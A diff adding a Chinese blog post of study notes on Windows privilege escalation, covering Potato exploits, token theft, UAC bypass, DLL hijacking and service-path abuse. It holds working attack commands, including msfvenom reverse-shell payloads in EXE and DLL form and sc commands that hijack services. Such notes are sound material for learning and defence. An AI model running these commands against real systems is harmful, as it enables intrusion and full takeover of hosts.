@@ -1,0 +1,418 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Windows提权小结 | xiaomao</title>
+<link rel="shortcut icon" href="https://xiaomaoq.github.io//favicon.ico?v=1742647247277">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://xiaomaoq.github.io//styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Windows提权小结 | xiaomao - Atom Feed" href="https://xiaomaoq.github.io//atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+​	最近重新学了一下xiaodi的提权课程，总结总结
+土豆家族
+低权限就行
+个人感觉这部分应该是实战用的最多的了。
+在我们获取WEB/数据库权限的时候，可以将低权限的服务用户提升为“NT AUTHORITY\SYSTEM”特权。拿到s..." />
+    <meta name="keywords" content="提权,笔记" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://xiaomaoq.github.io/">
+  <img class="avatar" src="https://xiaomaoq.github.io//images/avatar.png?v=1742647247277" alt="">
+  </a>
+  <h1 class="site-title">
+    xiaomao
+  </h1>
+  <p class="site-description">
+    取法乎上，仅得其中<br>
+取法乎中，仅得其下
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="https://xiaomaoq.github.io/guan-yu" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Windows提权小结
+            </h2>
+            <div class="post-info">
+              <span>
+                2024-01-17
+              </span>
+              <span>
+                9 min read
+              </span>
+              
+                <a href="https://xiaomaoq.github.io/deS5hM8TF/" class="post-tag">
+                  # 提权
+                </a>
+              
+                <a href="https://xiaomaoq.github.io/ujY9_0y-bw/" class="post-tag">
+                  # 笔记
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="前言">前言</h1>
+<p>​	最近重新学了一下xiaodi的提权课程，总结总结</p>
+<h1 id="土豆家族">土豆家族</h1>
+<p>低权限就行</p>
+<p>个人感觉这部分应该是实战用的最多的了。</p>
+<p>在我们获取WEB/数据库权限的时候，可以将低权限的服务用户提升为“NT AUTHORITY\SYSTEM”特权。拿到shell  上传🥔上去  然后点就ok了 (点鼠标的🐒</p>
+<pre><code>OK的就是比较好用的🥔
+https://mp.weixin.qq.com/s/OW4ybuqtErh_ovkTWLSr8w
+
+SweetPotato        OK
+RoguePotato
+BadPotato          OK
+EfsPotato          OK
+GodPotato          OK
+PetitPotato        OK
+MultiPotato
+CandyPotato
+RasmanPotato       OK
+CoercedPotato
+JuicyPotatoNG
+PrintNotifyPotato  OK
+
+
+GodPotato
+https://github.com/BeichenDream/GodPotato
+SweetPotato
+https://github.com/CCob/SweetPotato
+RoguePotato
+https://github.com/antonioCoco/RoguePotato
+BadPotato
+https://github.com/BeichenDream/BadPotato
+EfsPotato
+https://github.com/zcgonvh/EfsPotato
+MultiPotato
+https://github.com/S3cur3Th1sSh1t/MultiPotato
+CandyPotato
+https://github.com/klezVirus/CandyPotato
+RasmanPotato
+https://github.com/crisprss/RasmanPotato
+PetitPotato
+https://github.com/wh0amitz/PetitPotato
+JuicyPotatoNG
+https://github.com/antonioCoco/JuicyPotatoNG
+PrintNotifyPotato
+https://github.com/BeichenDream/PrintNotifyPotato
+CoercedPotato
+https://github.com/Prepouce/CoercedPotato
+</code></pre>
+<h1 id="手工提权">手工提权</h1>
+<p>一般都是用工具  手工遇到的情况复杂多变  (我是工具小子🤡</p>
+<p>先用 systeminfo获得基本信息</p>
+<p>2、补丁筛选</p>
+<p>https://i.hacking8.com/tiquan   （网站</p>
+<p>https://github.com/bitsadmin/wesng (exe)</p>
+<p>python wes.py systeminfo.txt --color</p>
+<p>python wes.py systeminfo.txt --color -i &quot;Elevation of Privilege&quot;</p>
+<p>3、EXP获取执行</p>
+<p>KernelHub 针对常用溢出编号指定找EXP</p>
+<p>Poc-in-Github 针对年份及编号指定找EXP</p>
+<p>exploitdb 针对类型及关键说明指定找EXP</p>
+<p>https://github.com/Ascotbe/Kernelhub</p>
+<p>https://github.com/nomi-sec/PoC-in-GitHub</p>
+<p>https://gitlab.com/exploit-database/exploitdb</p>
+<h1 id="第三方软件提权">第三方软件提权</h1>
+<p>感觉用处不大 --   用cs上线了  在cs上面的插件操作</p>
+<h1 id="服务启动atsc-提权">服务启动AT&amp;SC  提权</h1>
+<p>在administrators权限下进行   到system</p>
+<h2 id="1-at命令提权的原理">1、at命令提权的原理</h2>
+<p>at命令是一个计划命令，可以在规定时间完成一些操作，这个命令调用system权限。</p>
+<p>适用版本：Win2000 &amp; Win2003 &amp; XP中还是存在的，在Win7 以后被剔除.</p>
+<p>当我们拿到administrators的用户，通过连接上服务器后，可以通过at命令来进行本地提权。</p>
+<p>提权命令：</p>
+<p><code>at 21:00 /interactive cmd</code> (在21:00分生成一个交互式的System权限的cmd)</p>
+<h2 id="2-sc">2、sc</h2>
+<p>是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于控制面板中管理工具项中的服务</p>
+<p>适用版本：基本都适用</p>
+<p>#创建一个名叫syscmd的新的交互式的cmd执行服务 (执行后门)</p>
+<p><code>sc Create syscmd1  binPath= &quot;cmd /K start&quot; type= own type= interact</code></p>
+<p><code>sc Create xiaodi binPath= &quot;d:\artifact.exe&quot;</code></p>
+<p>#运行服务</p>
+<p><code>sc start syscmd1</code></p>
+<p><code>sc start xiaodi</code></p>
+<h1 id="远程控制提权">远程控制（提权）</h1>
+<p>在administrators权限下进行      先把软件下载然后上传到服务器</p>
+<h2 id="ps">ps</h2>
+<p>适用版本：基本可以</p>
+<p>但是需要下这个工具包 。</p>
+<p>https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</p>
+<p>#调用运行cmd</p>
+<p><code>psexec.exe -accepteula -s -i -d cmd</code></p>
+<p><code>psexec.exe -accepteula -s -i -d artifact.exe</code></p>
+<h1 id="进程注入降权-提权">进程注入（降权 提权</h1>
+<p>在administrators权限下进行</p>
+<p>相当于开了一后门，注入到其他exe进程下！(webshell 用户组权限 做不了 )</p>
+<h2 id="msf">MSF</h2>
+<p>本地权限</p>
+<p>ps 								//查看进程   找到system权限的进程</p>
+<p>migrate PID				 //迁移对应PID</p>
+<p>​</p>
+<h2 id="cs">cs</h2>
+<p>ps //查看进程</p>
+<p>inject PID //注入对应PID</p>
+<ul>
+<li>Win2008以前版本 -Test in Win2k3-本地权限-本地虚拟机</li>
+</ul>
+<p>​		<code>pinjector -l</code></p>
+<p>​		<code>pinjector -p 420 cmd 3333</code></p>
+<p>​		<code>nc 192.168.46.149 3333</code></p>
+<h1 id="令牌窃取降权-提权">令牌窃取（降权 提权</h1>
+<p>在administrators权限下进行</p>
+<p>假冒令牌可以假冒一个网络中的另一个用户进行各类操作。</p>
+<p>所以当一个攻击者需要域管理员的操作权限时候，需通过假冒域管理员的令牌进行攻击。</p>
+<hr>
+<h2 id="msf-2">MSF</h2>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=1 LPORT=3333 -f exe -o msf.exe   (生成个后门exe)</code></p>
+<p><code>use incognito</code></p>
+<p><code>list_tokens -u</code></p>
+<p><code>impersonate_token &quot;NT AUTHORITY\SYSTEM&quot;</code></p>
+<h2 id="cs-2">cs</h2>
+<p><code>ps</code> 	//查看进程</p>
+<p><code>steal_token PID</code> 	//窃取进程令牌</p>
+<p><code>spawnu PID</code>	 //窃取进程令牌上线</p>
+<h2 id="为什么降权">为什么降权？</h2>
+<p>在域环境的情况下   administrators权限很尴尬  他看不到域有什么 没法与域通讯(不在域类)   所以要提权 or 降权</p>
+<ul>
+<li>
+<p>提权system(脱管了)与内网交互</p>
+</li>
+<li>
+<p>降权到域用户与内网交互</p>
+</li>
+</ul>
+<h1 id="bypassuac">BypassUAC</h1>
+<p>为了远程执行目标的exe或者bat可执行文件绕过此安全机制，以此叫BypassUAC</p>
+<p>绕过项目：MSF内置，Powershell渗透框架，<strong>UACME项目</strong>(推荐)</p>
+<p>开启UAC和未开启UAC时,MSF默认getsystem提权会受到影响(进程注入)</p>
+<p>我win2016 不管什么等级都可以直接getsystem</p>
+<h3 id="1-msf模块">1、MSF模块：</h3>
+<p>先 backgroud    然后set  session设置为开始连的那个</p>
+<p>-Test in Win7 本地电脑 <strong>本地权限</strong></p>
+<p><code>use exploit/windows/local/bypassua</code></p>
+<p>-Test in Win10 本地电脑 <strong>本地权限</strong></p>
+<p><code>use exploit/windows/local/ask</code></p>
+<p><code>use exploit/windows/local/bypassuac_sluihijack</code></p>
+<p><code>use exploit/windows/local/bypassuac_silentcleanup</code></p>
+<h3 id="2-uacme项目">2、UACME项目：</h3>
+<p>https://github.com/hfiref0x/UACME</p>
+<p>用 这个项目去调用 木马程序  进行上线可以得到更高的权限   在msf中就可以直接getsystem  你直接调用木马程序 可能就不能够直接getsystem</p>
+<figure data-type="image" tabindex="1"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202312061600114.png" alt="image-20231206160013066" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202312061600153.png" alt="image-20231206160040137" loading="lazy"></figure>
+<p>Akagi64.exe 41 msf1.exe</p>
+<p>Akagi64.exe 编号 调用执行</p>
+<p>直接调用上线<img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401171937287.png" alt="image-20240117193742221" loading="lazy"></p>
+<p>用项目调用上线</p>
+<figure data-type="image" tabindex="3"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202401171938038.png" alt="image-20240117193826001" loading="lazy"></figure>
+<h1 id="dll劫持提权应用">DLL劫持提权应用</h1>
+<p>能不能进行操作看目录权限设置 决定</p>
+<p>原理：Windows程序启动的时候需要DLL。如果这些DLL 不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：</p>
+<p>1、应用程序加载的目录</p>
+<p>2、C:\Windows\System32</p>
+<p>3、C:\Windows\System					这些都动不了</p>
+<p>4、C:\Windows</p>
+<p>5、当前工作目录Current Working Directory，CWD</p>
+<p>6、在PATH环境变量的目录（先系统后用户）</p>
+<p>过程：信息收集-进程调试-制作dll并上传-替换dll-启动应用后成功</p>
+<p>检测： ChkDllHijack  火绒剑</p>
+<p>项目：https://github.com/anhkgg/anhkgg-tools</p>
+<p>利用火绒剑进行进程分析加载DLL，一般寻程序DLL利用。</p>
+<p>制作含木马的dll</p>
+<p><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.192.129 lport=4444 -f dll -o xiaodi.dll</code></p>
+<p>提前信息收集相关软件及DLL问题程序，本地调试成功后覆盖DLL实现利用</p>
+<h1 id="不带引号服务路径">不带引号服务路径</h1>
+<p>能不能进行操作看目录权限设置 决定</p>
+<p>不带引号＋空格</p>
+<p>https://blog.csdn.net/weixin_54977781/article/details/130460369</p>
+<p>https://zhuanlan.zhihu.com/p/403098970?utm_id=0</p>
+<p>配合MSF-MacroExpert服务</p>
+<figure data-type="image" tabindex="4"><img src="https://maomaoqing.oss-cn-shenzhen.aliyuncs.com/mm/202312061939531.png" alt="20201014150247256" loading="lazy"></figure>
+<p>https://blog.csdn.net/weixin_44032232/article/details/109073666</p>
+<p>原理：如果没带引号 然后又有空格的目录就会认为是文件＋参数   类似这样c:\program files.exe    c:\program后面的files.exe 就会被认为是参数</p>
+<p>用生成的后门exe  改个名字成 program.exe 放在c盘  重启服务就会调用它   然后就上线了</p>
+<p>检测项目：JAWS    用他检测哪有不安全的路径  但是我本机  win2008 都无法运行ps1脚本 。  也可以用PEASS-ng这个项目 但是感觉挺鸡肋的就不想试了</p>
+<p>我们用以下命令来搜索哪些服务路径没有包含引号:（我用不了</p>
+<p><code>wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;</code></p>
+<h1 id="不安全的服务权限">不安全的服务权限</h1>
+<p>实战基本上用不到</p>
+<p><strong>服务权限问题  可以修改服务对应的路径</strong></p>
+<p>原理：即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。</p>
+<p>过程：检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功</p>
+<p>这个攻击方法大致分两类</p>
+<p>1.替换服务的二进制文件。这个方法较为简单，如果对服务二进制文件所在目录有修改权，那么我们完全可以创建一个恶意程序来替换原有的二进制文件服务。这个比较简单，而且基本上攻击流程和Trusted Service Paths如出一辙，同样也是比较被动地等待重启服务才能弹shell，就不再演示了。</p>
+<p>2.修改服务的属性。如果我们能修改服务的 BINARY_PATH_NAME 属性（这个属性用于指向服务的二进制文件），我们就可以通过设置 BINARY_PATH_NAME 的值为系统命令，然后重启服务时我们的系统命令会被执行。</p>
+<p>对于后者，我们需要一款工具来快速揭示出我们能修改哪些服务的属性。 这个工具我们采用accesschk.exe，它是微软产出的，基本不会报毒。</p>
+<p>我们通过该工具执行以下命令</p>
+<p>1、<code>accesschk.exe -uwcqv &quot;administrators&quot; *</code></p>
+<p>如果对某个服务有service_all_access或者以下权限，就说明能对其属性进行修改。</p>
+<figure data-type="image" tabindex="5"><img src="https://pic2.zhimg.com/80/v2-004ef2cfde53805e6a79b4a691272a31_1440w.webp" alt="img" loading="lazy"></figure>
+<p>通过修改其binPath为恶意指令，然后等待管理员重启服务，我们的恶意指令就会被执行。</p>
+<p><code>sc config &quot;WinHttpAutoProxySvc&quot; binpath=&quot;C:\Users\Administrator\Desktop\msf.exe&quot;</code></p>
+<p><code>sc start WinHttpAutoProxySvc</code></p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E5%9C%9F%E8%B1%86%E5%AE%B6%E6%97%8F">土豆家族</a></li>
+<li><a href="#%E6%89%8B%E5%B7%A5%E6%8F%90%E6%9D%83">手工提权</a></li>
+<li><a href="#%E7%AC%AC%E4%B8%89%E6%96%B9%E8%BD%AF%E4%BB%B6%E6%8F%90%E6%9D%83">第三方软件提权</a></li>
+<li><a href="#%E6%9C%8D%E5%8A%A1%E5%90%AF%E5%8A%A8atsc-%E6%8F%90%E6%9D%83">服务启动AT&amp;SC  提权</a>
+<ul>
+<li><a href="#1-at%E5%91%BD%E4%BB%A4%E6%8F%90%E6%9D%83%E7%9A%84%E5%8E%9F%E7%90%86">1、at命令提权的原理</a></li>
+<li><a href="#2-sc">2、sc</a></li>
+</ul>
+</li>
+<li><a href="#%E8%BF%9C%E7%A8%8B%E6%8E%A7%E5%88%B6%E6%8F%90%E6%9D%83">远程控制（提权）</a>
+<ul>
+<li><a href="#ps">ps</a></li>
+</ul>
+</li>
+<li><a href="#%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5%E9%99%8D%E6%9D%83-%E6%8F%90%E6%9D%83">进程注入（降权 提权</a>
+<ul>
+<li><a href="#msf">MSF</a></li>
+<li><a href="#cs">cs</a></li>
+</ul>
+</li>
+<li><a href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E9%99%8D%E6%9D%83-%E6%8F%90%E6%9D%83">令牌窃取（降权 提权</a>
+<ul>
+<li><a href="#msf-2">MSF</a></li>
+<li><a href="#cs-2">cs</a></li>
+<li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%99%8D%E6%9D%83">为什么降权？</a></li>
+</ul>
+</li>
+<li><a href="#bypassuac">BypassUAC</a><br>
+*
+<ul>
+<li><a href="#1-msf%E6%A8%A1%E5%9D%97">1、MSF模块：</a></li>
+<li><a href="#2-uacme%E9%A1%B9%E7%9B%AE">2、UACME项目：</a></li>
+</ul>
+</li>
+<li><a href="#dll%E5%8A%AB%E6%8C%81%E6%8F%90%E6%9D%83%E5%BA%94%E7%94%A8">DLL劫持提权应用</a></li>
+<li><a href="#%E4%B8%8D%E5%B8%A6%E5%BC%95%E5%8F%B7%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84">不带引号服务路径</a></li>
+<li><a href="#%E4%B8%8D%E5%AE%89%E5%85%A8%E7%9A%84%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90">不安全的服务权限</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://xiaomaoq.github.io/2023-nian-du-zong-jie/">
+              <h3 class="post-title">
+                2023年度总结
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://xiaomaoq.github.io//atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
